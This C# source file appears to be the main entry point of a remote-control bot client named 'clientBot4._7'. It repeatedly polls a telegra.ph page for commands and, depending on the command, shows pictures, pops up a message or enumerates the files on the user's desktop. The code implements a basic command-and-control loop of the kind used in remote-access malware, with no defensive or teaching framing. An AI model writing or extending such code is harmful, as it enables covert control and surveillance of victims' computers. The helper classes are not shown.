using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace clientBot4._7
{
    static class Program
    {
      
        //Запрос на сервер раз в 1000 секунд
        //todo fix bug with exeception
        //add functions
        [STAThread]
        static void Main()
        {
            WebCommand wc = new WebCommand("https://telegra.ph/Tets-09-14");
            BotFunctions bt = new BotFunctions(wc);
            while (true)
            {
                Thread.Sleep(1000);
                Console.WriteLine(wc.command);
                if (wc.command == "reb")
                {
                    bt.ShowPrettyPictures();
                }
                if (wc.command == "dir")
                {
                    bt.GetAllFilesOnDesktop();                    
                }
                if(wc.command == "msg")
                {
                    bt.ShowMessage();
                }
            }



            
        }
    }
}
